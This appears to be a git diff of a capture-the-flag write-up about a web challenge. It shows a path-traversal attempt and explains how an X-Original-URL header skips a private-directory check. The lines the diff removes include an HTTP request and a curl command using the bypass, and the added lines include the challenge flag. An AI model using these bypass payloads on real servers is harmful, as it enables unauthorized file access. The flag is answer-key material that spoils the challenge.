@@ -180,7 +180,7 @@ Based on this structure, my first attempt was logical:
 3. Since I had LFI, I tried:
  `/../../../app/data/vault/flag.txt`
 
-![gg](https://0xuserm9.vercel.app/images/nex/3.PNG)
+![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/3.PNG)
 
 ### Understanding Why 403 Happened
 Looking at the code, the normal request flow has this check:
@@ -213,24 +213,18 @@ if (method === "GET") {
     // ... rest of normal flow with security checks
 }
 ```
+**Key Insight:**
+- The X-Original-URL header creates a different file access path:
+- Uses `path.join(BASE, overrideUrl)` instead of normal path resolution
+- Missing the `startsWith(PRIVATE_DIR)` check!
+- Allows bypassing the `403 restriction`
 
+### 🏴‍☠️ The Successful Exploit:
+###### I could use the header to access it:
 
+![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/challenge.PNG)
 
-```http
-GET / HTTP/1.1
-Host: target
-X-Original-URL: /vault/flag.txt
-```
-
-Or using curl:
-
-```bash
-curl -H "X-Original-URL: /vault/flag.txt" http://target/
-```
-
-🎉 The flag is returned.
-
----
+#### The Flag: `nexus{w3bd4v_wchw3y4_h3d34rs_eezzzzzzzzz}`
 
 ## Lessons Learned
 
@@ -241,19 +235,4 @@ curl -H "X-Original-URL: /vault/flag.txt" http://target/
 - Security checks must be consistent
 
 ---
-
-## How to Fix
-
-- Normalize and validate all file paths
-- Apply access control on every read path
-- Disable stack traces in production
-- Do not trust proxy headers blindly
-
----
-
-## Conclusion
-
-This challenge demonstrates how chaining small vulnerabilities can lead to full compromise.  
-No brute force, no fuzzing — only logic.
-
 Happy hacking 🏴‍☠️
